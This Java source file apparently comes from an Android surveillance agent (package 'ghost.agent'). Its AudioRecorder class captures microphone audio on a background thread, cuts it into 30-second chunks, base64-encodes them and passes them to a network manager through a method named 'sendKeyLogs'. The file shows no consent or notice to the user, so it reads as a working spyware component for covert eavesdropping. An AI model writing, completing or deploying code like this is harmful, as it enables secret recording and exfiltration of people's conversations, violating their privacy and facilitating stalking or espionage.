package com.ghost.agent.core;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class AudioRecorder {
    
    private static final String TAG = "AudioRecorder";
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL = AudioFormat.CHANNEL_IN_MONO;
    private static final int FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, FORMAT) * 2;
    
    private Context context;
    private NetworkManager networkManager;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private HandlerThread thread;
    private Handler handler;
    private ByteArrayOutputStream stream;
    
    public AudioRecorder(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
        
        thread = new HandlerThread("AudioRecording");
        thread.start();
        handler = new Handler(thread.getLooper());
    }
    
    public void startRecording() {
        if (isRecording) return;
        
        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE, CHANNEL, FORMAT, BUFFER_SIZE
            );
            
            stream = new ByteArrayOutputStream();
            audioRecord.startRecording();
            isRecording = true;
            
            handler.post(this::recordLoop);
            
            Log.i(TAG, "Enregistrement démarré");
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
    }
    
    private void recordLoop() {
        byte[] buffer = new byte[BUFFER_SIZE];
        
        while (isRecording) {
            int read = audioRecord.read(buffer, 0, buffer.length);
            if (read > 0) {
                try {
                    stream.write(buffer, 0, read);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            
            if (stream.size() > SAMPLE_RATE * 30 * 2) {
                sendChunk();
            }
        }
    }
    
    public String stopRecording() {
        isRecording = false;
        
        if (audioRecord != null) {
            audioRecord.stop();
            audioRecord.release();
            audioRecord = null;
        }
        
        return sendChunk();
    }
    
    private String sendChunk() {
        if (stream == null || stream.size() == 0) return null;
        
        byte[] data = stream.toByteArray();
        stream.reset();
        
        String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
        networkManager.sendKeyLogs(base64);
        
        return base64;
    }
}
